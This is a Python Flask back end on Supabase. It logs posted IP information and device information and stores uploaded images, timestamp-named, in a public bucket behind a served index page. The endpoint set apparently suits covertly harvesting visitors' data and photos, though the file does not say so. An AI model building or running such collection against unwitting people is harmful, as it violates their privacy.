from supabase import create_client
from flask import Flask, request, jsonify, Response
from flask_cors import CORS
from datetime import datetime
import os
import logging
from werkzeug.utils import secure_filename

# -----------------------------
# Configuration
# -----------------------------

SUPABASE_URL = os.environ.get("SUPABASE_URL")
SUPABASE_KEY = os.environ.get("SUPABASE_SERVICE_KEY")
STORAGE_BUCKET = "images"
MAX_FILE_SIZE = 5 * 1024 * 1024  # 5MB
ALLOWED_EXTENSIONS = {"jpg", "jpeg", "png", "webp"}

if not SUPABASE_URL or not SUPABASE_KEY:
    raise ValueError("Missing SUPABASE_URL or SUPABASE_SERVICE_KEY environment variables")

# -----------------------------
# App Setup
# -----------------------------

app = Flask(__name__)
CORS(app)
app.config["MAX_CONTENT_LENGTH"] = MAX_FILE_SIZE

logging.basicConfig(level=logging.INFO)
log = logging.getLogger("werkzeug")
log.setLevel(logging.ERROR)

# -----------------------------
# Supabase Client
# -----------------------------

supabase = create_client(SUPABASE_URL, SUPABASE_KEY)

# -----------------------------
# Utility Functions
# -----------------------------

def check_supabase_connection():
    try:
        supabase.table("logs").select("*").limit(1).execute()
        logging.info("✅ Supabase connected successfully")
        return True
    except Exception as e:
        logging.error(f"❌ Supabase connection failed: {e}")
        return False


def allowed_file(filename):
    return "." in filename and filename.rsplit(".", 1)[1].lower() in ALLOWED_EXTENSIONS


def save_to_db(payload):
    try:
        supabase.table("logs").insert({
            "data": payload,
            "created_at": datetime.utcnow().isoformat()
        }).execute()
        logging.info(f"Saved to DB: {payload.get('type')}")
    except Exception as e:
        logging.error(f"DB Save Error: {e}")

# -----------------------------
# Routes
# -----------------------------

@app.route("/")
def index():
    if os.path.exists("index.html"):
        return Response(open("index.html").read(), mimetype="text/html")
    return "Server Running", 200


@app.route("/health", methods=["GET"])
def health_check():
    if check_supabase_connection():
        return jsonify({"status": "healthy"}), 200
    return jsonify({"status": "unhealthy"}), 500


@app.route("/api/ipinfo", methods=["POST"])
def ipinfo():
    try:
        iplogs = request.json
        save_to_db({"type": "ipinfo", "data": iplogs})
        return jsonify({"status": "success"}), 200
    except Exception as e:
        logging.error(e)
        return jsonify({"error": str(e)}), 400


@app.route("/api/device-info", methods=["POST"])
def device_info():
    try:
        logs = request.json
        save_to_db({"type": "deviceinfo", "data": logs})
        return jsonify({"status": "success"}), 200
    except Exception as e:
        logging.error(e)
        return jsonify({"error": str(e)}), 400


@app.route("/api/upload-image", methods=["POST"])
def upload_image():
    try:
        image = request.files.get("image")

        if not image:
            return jsonify({"error": "No image provided"}), 400

        if not allowed_file(image.filename):
            return jsonify({"error": "Invalid file type"}), 400

        filename = secure_filename(image.filename)
        extension = filename.rsplit(".", 1)[1].lower()
        new_filename = f"{datetime.utcnow().strftime('%Y%m%d-%H%M%S')}.{extension}"

        file_bytes = image.read()

        if len(file_bytes) > MAX_FILE_SIZE:
            return jsonify({"error": "File too large"}), 400

        # Upload to Supabase Storage
        supabase.storage.from_(STORAGE_BUCKET).upload(
            path=new_filename,
            file=file_bytes,
            file_options={"content-type": image.content_type}
        )

        # Generate public URL
        public_url = supabase.storage.from_(STORAGE_BUCKET).get_public_url(new_filename)

        # Save metadata to DB
        save_to_db({
            "type": "image",
            "filename": new_filename,
            "url": public_url
        })

        return jsonify({
            "status": "success",
            "filename": new_filename,
            "url": public_url
        }), 200

    except Exception as e:
        logging.error(f"Upload error: {e}")
        return jsonify({"error": str(e)}), 400


# -----------------------------
# Run App
# -----------------------------

if __name__ == "__main__":
    if check_supabase_connection():
        app.run(debug=False, host="0.0.0.0", port=8080)
    else:
        logging.error("Server not started due to Supabase connection failure")